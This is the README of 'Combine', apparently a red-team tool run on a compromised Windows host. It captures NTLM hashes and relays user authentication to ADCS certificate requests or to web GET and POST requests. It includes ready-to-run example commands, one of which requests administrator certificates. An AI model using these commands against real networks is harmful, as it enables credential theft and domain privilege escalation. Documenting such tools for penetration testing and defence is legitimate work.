# Combine

Author: @mattsteer - matt@shadesecurity.com

I was once a simple farmer, then i got power tools!

Props: @dmchell, @rmortega77 
```
Combine.exe [options]

Combine can be used as a replacement for farmer. Run the binary on a target host by some means and encourage users/hosts to visit.

Running Combine without options will output captured hashes to stdout, targeting any connecting user/host for 600 seconds

The following options are supported:
/attack         integer [0..3]          The attack to perform (see below).
/port           integer                 The port to listen on.
/timer          integer                 The time in seconds to run for.
/targetserver   string                  The relay target host.
/targetusers    comma-seperated string  The list of users to attack.
/template       string                  The certificate template to request from the CA.
/postdata       string                  A URL encoded string to send to the target server in post body.
/contenttype    string                  The content-type of the post data.
/help                                   You're reading it!

Attacks:
0. Dump Hash - Dump hashes. - No arguments required
1. Certificate Request - Request a certificate from ADCS. - Requires: /targetserver /template
2. Get Request - Sends a GET request to the target server. Pass the full url to /targetserver including any parameters. - Requires: /targetserver
3. Post Request - Sends a POST request to the target server. Pass the full url to /targetserver, post body data should be URL encoded. - Requires: /targetserver /postdata /contenttype

Examples:

Combine.exe /port:8888 /timer:0 /attack:1 /targetuser:administrator /template:administrator /targetserver:http://ca.domain.com
Run Combine on port 8888 forever. Request certificates from ca.domain.com with a template = administrator only targeting username = administrator

Combine.exe /port:8080 /timer:300 /attack:2 /targetuser:user1,user2 /targetserver:http://web.domain.com/index.php?param=1
Run Combine on port 8080 for 300 seconds. Send GET requests to web.domain.com only targeting usernames user1 and user2

Combine.exe /port:8080 /timer:300 /attack:3 /targetuser:user1,user2 /targetserver:http://web.domain.com/index.php
 /postdata:param1=value1&param2=value2 /contenttype:text/plain
Run Combine on port 8080 for 300 seconds. Send POST requests to web.domain.com only targeting usernames user1 and user2
```
